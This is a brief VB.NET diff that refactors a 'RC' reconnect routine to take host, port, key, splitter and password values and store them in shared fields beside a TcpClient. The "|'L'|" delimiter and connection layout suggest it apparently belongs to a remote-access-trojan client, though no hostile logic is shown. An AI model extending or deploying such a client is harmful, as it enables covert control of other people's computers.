@@ -5,11 +5,14 @@ Public Class Main
 
 
 
-    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal PW As String)
+    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String)
 
         KEY = K
-        pass = PW
-        ' create memory stream
+        HOST = H
+        PORT = P
+        SPL = SP
+        PASS = PW
+
         Dim lp As Integer = 0
 
         ' clear things and ReConnect
@@ -226,11 +229,11 @@ cc:
     End Function
 
     Public Shared C As TcpClient = Nothing
-    Public Shared KEY As String = String.Empty
-    Public Shared _H
-    Public Shared _P
-    Public Shared SPL As String = "|'L'|"
+    Public Shared KEY As String
+    Public Shared HOST As String
+    Public Shared PORT As Integer
+    Public Shared SPL As String
+    Public Shared PASS As String
     Public Shared M As New IO.MemoryStream
-    Public Shared pass As String = "|'X'|"
 
 End Class
